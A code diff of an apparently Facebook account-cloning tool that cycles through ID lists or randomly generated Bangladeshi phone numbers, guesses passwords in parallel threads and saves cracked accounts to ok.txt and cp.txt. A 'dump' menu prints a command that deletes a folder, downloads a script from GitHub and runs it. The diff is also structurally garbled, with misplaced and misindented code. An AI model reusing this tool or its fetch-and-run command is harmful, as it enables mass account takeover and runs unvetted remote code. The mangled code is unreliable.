@@ -247,39 +247,60 @@ def admin():
 	os.system('clear')
 	print(logo)
 	print(50*'_')
-	print(' [1] Contract WhatsApp ')
-	print(' [2] JOIN MY FB GROUP ')
-	print(' [3] FOLLOW MY GITHUB ')
-	print(' [0] Back to Main menu')
-	bal = input('Choose option >>> ')
-	if bal =='1':
-		os.system('xdg-open https://wa.me/+923021431324');time.sleep(1)
-		admin()
-	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/');time.sleep(1)
-		admin()
-	if bal =='3':
-		os.system('xdg-open https://github.com/CyberAttack85/Cyber-Attack.git');time.sleep(1)
-		admin()
-	if bal =='0':
-		Main()
+		p(" [1] FILE CLONING ")
+		p(" [2] RANDOM CLONING ")
+		p(" [3] DUMP TOOL ")
+		p(" [4] PASS CHANGER ")
+		p(" [E] EXIT TOOL ") 
+		line()
+		opt1 = input(" \033[1;92m[•] \033[1;97m Select an Option : ")
+		if opt1 == "1":self.file_menu()
 		
-def virusA():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
-	kode = input(' ┗━[+] SELECT : ')
-	doamin = ' BD Number id cloner [ONLY-OK] '
-	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
-	limit = int(input(' ┗━[+] LIMIT : '))
-	for nmbr in range(limit):
-		koda = ''.join(random.choice(string.digits) for _ in range(2))
-		kodb = ''.join(random.choice(string.digits) for _ in range(2))
-		nmp = ''.join(random.choice(string.digits) for _ in range(4))
-		user.append(nmp)
-	with ThreadPool(max_workers=60) as yaari:
-		os.system('clear')
+		elif opt1 == "2":self.num_menu()
+		elif opt1 == "4":automation().menu()
+		elif opt1 == "3":Grep().links_only()
+		elif opt1 == "E":exit(" \033[1;92m [•] KHATAM TATA BY BY")
+		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
+	
+	
+	def dump_menu(self):
+		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
+		
+	def file_menu(self):
+		logo()
+		p(" \033[1;92m [•] EXAMPLE /sdcard/filename.txt")
+		file = input("\033[1;97m  [•] PUT FILE PATH : ")
+		try:
+			id = open(file,"r").read().splitlines()
+			self.method_select(id)
+		except FileNotFoundError:
+			p(" [•] File Path Incorrect ")
+			sp(2);self.file_menu()
+		
+	def method_select(self,id):
+		logo()
+		p(" [1] Method 1 ")
+		p(" [2] Mehtod 2 ")
+		p(" [3] Method 3 ")
+		p(" [4] Method 4 " )
+		line()
+		m_opt = input(" [•] Choose : ")
+		if m_opt =='1':
+			method.append("i")
+			self.password_menu(id)
+		elif m_opt =="2":
+			method.append('ii')
+			self.password_menu(id)
+		elif m_opt =="3":
+			method.append('iii')
+			self.password_menu(id)
+		elif m_opt =="4":
+			 method.append('iiii')
+			 self.password_menu(id)
+		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
+
+	def password_menu(self,id):
+		pwx=[]
 		print(logo)
 		tl = str(len(user))
 		print('┏━[•] COUNTRY    : Bangladesh')
@@ -296,14 +317,7 @@ def virusA():
 	print(' [💉] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
-	
-elif opt1 == "2":self.num_menu()
-		elif opt1 == "4":automation().menu()
-		elif opt1 == "3":Grep().links_only()
-		elif opt1 == "E":exit(" \033[1;92m [•] KHATAM TATA BY BY")
-		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
-	
-	
+
 def b(uid,pwx,tl):
     global loop
     global cps    
